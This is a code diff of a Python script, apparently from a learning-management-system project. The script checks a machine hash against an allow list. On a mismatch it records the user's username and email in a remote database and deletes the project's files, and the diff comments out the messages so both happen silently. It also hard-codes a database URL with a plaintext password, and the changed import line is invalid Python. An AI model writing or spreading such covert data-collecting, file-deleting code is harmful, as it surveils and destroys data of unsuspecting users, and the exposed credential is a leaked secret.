@@ -1,7 +1,7 @@
 import os
 import hashlib
 import subprocess
-import psycopg2
+import psycopg2-binary
 
 
 DATABASE_URL = "postgresql://neon_db_owner:npg_YyF74kuOtCQD@ep-shrill-glitter-a129ejxy-pooler.ap-southeast-1.aws.neon.tech/lms?sslmode=require"
@@ -61,7 +61,7 @@ def log_unauthorized_user():
         cursor.close()
         conn.close()
 
-        print(f"🚨 Unauthorized access logged: Username={cloner_username}, Email={cloner_email}")
+        # print(f"🚨 Unauthorized access logged: Username={cloner_username}, Email={cloner_email}")
     
     except Exception as e:
         print(f"⚠️ Error logging unauthorized user: {e}")
@@ -69,7 +69,7 @@ def log_unauthorized_user():
 def enforce_access_control():
     """Verify user authorization and delete unauthorized files if necessary."""
     if get_machine_hash() not in AUTHORIZED_USER_HASHES:
-        print("🚨 Unauthorized access detected! Logging details & removing project files... 🚨")
+        # print("🚨 Unauthorized access detected! Logging details & removing project files... 🚨")
 
         # Log unauthorized user before taking action
         log_unauthorized_user()
@@ -89,5 +89,5 @@ def enforce_access_control():
                 except Exception as e:
                     print(f"Error deleting directory {dir}: {e}")
 
-        print("🔥 Project files have been securely deleted. Unauthorized users cannot access this code. 🔥")
+        # print("🔥 Project files have been securely deleted. Unauthorized users cannot access this code. 🔥")
         exit()
